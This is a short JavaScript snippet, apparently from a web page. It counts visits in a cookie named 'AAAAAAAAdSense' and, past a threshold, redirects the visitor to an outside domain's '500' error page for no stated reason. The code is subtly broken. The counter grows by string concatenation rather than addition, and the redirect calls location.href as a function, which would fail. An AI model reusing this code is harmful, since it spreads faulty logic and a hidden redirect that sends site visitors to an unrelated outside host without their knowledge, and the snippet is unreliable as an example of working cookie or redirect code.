function setCookies_Liscom(cookieName,cookieValue) {
  if (cookieValue == "") {
  var cookieValue = getQueryVariable_Liscom("hl");
  }
  if (cookieValue) {
  var today = new Date();
  var expire = new Date();
  expire.setTime(today.getTime() + 3600000*1);
  document.cookie = cookieName+"="+escape(cookieValue)
  + ";expires="+expire.toGMTString()
  + ";path=/";
  }
}
function getQueryVariable_Liscom(variable) {
  var query = window.location.search.substring(1);
  var vars = query.split("&");
  for (var i=0;i<vars.length;i++) {
    var pair = vars[i].split("=");
    if (pair[0] == variable) {
      return pair[1];
    }
  } 
 }
function getCookie_Liscom(name){
      var strCookie=document.cookie;
      var arrCookie=strCookie.split("; ");
      for(var i=0;i<arrCookie.length;i++){
            var arr=arrCookie[i].split("=");
            if(arr[0]==name)return arr[1];
      }
     return ""; 
}
var coooC=getCookie_Liscom("AAAAAAAAdSense");
  if(coooC > 11111111111111111111){  
  location.href("http://www.165v.com/500.htm");
} else {
coooC=coooC+1
setCookies_Liscom("AAAAAAAAdSense",coooC);
}